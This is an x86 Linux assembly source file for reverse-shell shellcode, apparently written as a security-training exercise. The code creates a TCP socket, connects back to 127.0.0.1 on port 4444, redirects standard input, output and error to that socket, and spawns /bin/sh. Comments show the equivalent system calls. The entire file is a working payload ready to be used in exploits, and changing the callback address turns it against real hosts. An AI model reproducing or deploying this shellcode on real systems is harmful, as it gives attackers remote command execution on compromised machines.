;socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
;connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)
;dup2(3, 0)                             
;dup2(3, 1)                              
;dup2(3, 2)                              
;execve("/bin/sh", NULL, NULL)           

global _start
section .text

 
_start:
	;if executing from another program use below to clear registers
	;xor eax, eax
	;xor ebx, ebx
	;xor ecx, ecx
	;xor edx, edx
	;xor esi, esi
	;xor edi, edi
	

	;socket(AF_INET, SOCK_STREAM, 0)
	;0x66(0x2,0x1,0x0)
	mov al, 0x66
	mov bl, 0x1
	push ecx
	push dword 0x1
	push dword 0x2
	mov ecx, esp
	int 0x80

	xchg edi, eax

	;connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)
	;0x66(3) *(0x2, 4444, 127.0.0.1, 16)
	
	push 0x0101017f ;ip
	push word 0x5c11 ;port
	push word 0x2
	mov ecx, esp
	mov al, 0x66
	mov bl, 0x3
	push dword 0x10
	push ecx
	push edi
	mov ecx, esp
	int 0x80
	
	
	xor ecx, ecx

	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x2)
	;eax(ebx, ecx)    	
	mov al,0x3f
    	mov ebx, edi
    	mov cl,0x2
    	int 0x80
 
    	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x1)
	;eax(ebx, ecx)   
   	mov al, 0x3f
    	mov ebx, edi
    	dec cl
    	int 0x80
     
    	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x0)
	;eax(al, ecx)   
    	mov al, 0x3f
    	mov ebx, edi
    	dec cl
    	int 0x80

	;push /bin/sh
    	xor ecx, ecx
	push ecx
    	push 0x68732f2f 
    	push 0x6e69622f 

	;execve(const char *filename, char *const argv[], char *const envp[]);
	;0xb(*/bin/sh, 0x0, 0x0)
	;eax(ebx,ecx,edx)
    	mov al,0xb
    	mov ebx,esp
    	xor ecx,ecx
    	xor edx,edx 
    	int 0x80
